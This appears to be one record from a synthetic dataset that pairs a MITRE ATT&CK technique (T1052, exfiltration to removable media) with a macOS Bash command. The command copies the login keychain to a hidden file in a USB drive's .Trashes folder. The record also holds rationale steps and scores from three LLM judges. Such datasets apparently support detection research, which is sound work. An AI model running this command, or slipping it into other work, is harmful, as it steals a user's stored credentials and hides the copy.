@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "dd if=\"$HOME/Library/Keychains/login.keychain-db\" of=\"/Volumes/NO\\ NAME/.Trashes/.kch\" bs=2m conv=sync,noerror && sync",
+  "explanation": "Copies the login keychain database as raw bytes to a hidden path inside the external drive's .Trashes directory using dd.",
+  "rationale_steps": [
+    "Select a sensitive local file to stage for removal.",
+    "Use dd to copy the file as raw data to a plausible hidden location on the USB.",
+    "Keep the operation local to the system with no network usage.",
+    "Sync to ensure data integrity on the removable media."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-24937b47-a1e902a4",
+  "source_prompt_hash": "24937b47",
+  "timestamp_utc": "2025-09-30T05:19:16.168507Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quotes, valid dd options, and correct chaining; the backslash within double quotes is literal but does not break parsing.",
+        "semantic_score": 4,
+        "semantic_justification": "It aligns with T1052 by copying the login keychain to a hidden file on an external drive via dd, though the backslash-escaped space inside quotes likely misaddresses the volume path and could cause failure.",
+        "combined_score": 4.5,
+        "confidence": 0.77,
+        "timestamp": "2025-10-01T07:51:19.859998Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid dd parameters, correct path escaping, and proper command chaining with &&.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1052 by copying the macOS keychain database (which contains passwords and credentials) to a hidden location on an external drive using dd for raw byte copying, with the destination being deliberately obscured in the .Trashes directory.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T07:51:23.452755Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags, proper command separators, and a parsable destination path string that the shell will pass to dd.",
+        "semantic_score": 3,
+        "semantic_justification": "The command correctly uses dd to exfiltrate a keychain to an external medium, aligning with the technique, but the `of` path for `/Volumes/NO\\ NAME/` is semantically flawed for a common 'NO NAME' drive and will likely fail to locate the intended volume.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T07:51:41.117384Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
